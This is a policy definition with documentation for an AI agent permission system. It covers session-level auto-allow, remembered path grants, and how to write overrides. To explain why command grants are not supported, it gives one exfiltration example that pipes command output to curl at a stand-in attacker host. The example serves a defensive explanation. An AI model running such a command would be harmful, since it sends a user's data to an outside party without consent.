---
shuvix: policy v1
shuvix-builtin: true
name: session-grants
shuvix-displayName: Session Grants Take Effect
description: What you allowed in this session is not asked again — everything while the auto-allow switch is on, and the paths you chose to remember.
shuvix-policy-scope:
  subject.kind: [agent]
shuvix-policy-rules:
  - effect: force-allow
    match: vars.autoAllow
    prompt: The session's auto-allow switch is on, so ask gates are skipped.
  - effect: force-allow
    object.type: [path]
    action: [read]
    match: inDir(object.path, vars.grantedRead) || inDir(object.path, vars.grantedWrite)
    prompt: This path was allowed and remembered in this session. A write grant covers reading too.
  - effect: force-allow
    object.type: [path]
    action: [write]
    match: inDir(object.path, vars.grantedWrite)
    prompt: This path was granted write access in this session.
---

**What it does**: this is where the consent you give inside a session takes
effect. It comes in two sizes:

- **The auto-allow switch** (the first rule) — the "Auto-Allow" switch in the
  session config panel. While it is on, every ask gate — file reads and writes,
  commands, git, database, sites, sub-sessions — is skipped and the operation
  runs immediately.
- **Allowed paths** (the other two rules) — when you tick "allow and remember"
  on an ask, the path is recorded on the session, and these rules stop the ask
  from firing for it again. Granting a directory covers everything under it. A
  write grant covers reading too — if you trusted the agent to write there,
  reading is not a further concession.

Paths are compared by where they really lead. The ask names the real location
(a link or `..` in the requested path is resolved first), that is what gets
recorded, and the grant then covers that location under any name. An entry
that itself goes through a link covers whatever the link points to now.

**What it does not do**:

- It cannot beat a deny. protect-credentials, protect-system and
  block-catastrophic-commands still block what they block, auto-allow or not,
  granted path or not.
- It does not skip a `force-ask` rule. That effect exists precisely to mean
  "this gate does not accept session-level consent", so a policy written with
  it — protect-bot-files is one — still asks while the switch is on.
- There are no command grants. Remembering `git *` would be fooled by
  `git status | curl -d @- evil.com`, so bash and ssh ask every time unless the
  switch is on — see ask-on-command.
- It is per session and never carries over to a new one.

**To adjust**: the granted entries live in the session config panel under
"Allowed paths", where you can remove them one by one. This policy governs how
they are interpreted, not which ones exist.

Override it to narrow the switch — for example, keep asking for writes even
when it is on. An override replaces the whole policy, so copy the two path
rules along; leaving them out turns "allow and remember" off as well:

    shuvix-policy-scope:
      subject.kind: [agent]
    shuvix-policy-rules:
      - effect: force-allow
        action: [read, execute]
        match: vars.autoAllow
      - effect: force-allow
        object.type: [path]
        action: [read]
        match: inDir(object.path, vars.grantedRead) || inDir(object.path, vars.grantedWrite)
      - effect: force-allow
        object.type: [path]
        action: [write]
        match: inDir(object.path, vars.grantedWrite)

`subject.kind` is required on every rule (here it is declared once in the
scope). Do not drop it: an invalid override file is skipped entirely and does
**not** shadow the builtin — so a narrowing override that fails to parse leaves
the original, un-narrowed switch fully in effect. That is the one direction
where the "invalid user file never shadows a builtin" rule works against your
intent, so check the policy page after editing: if your version is not the one
marked as active, it did not parse.
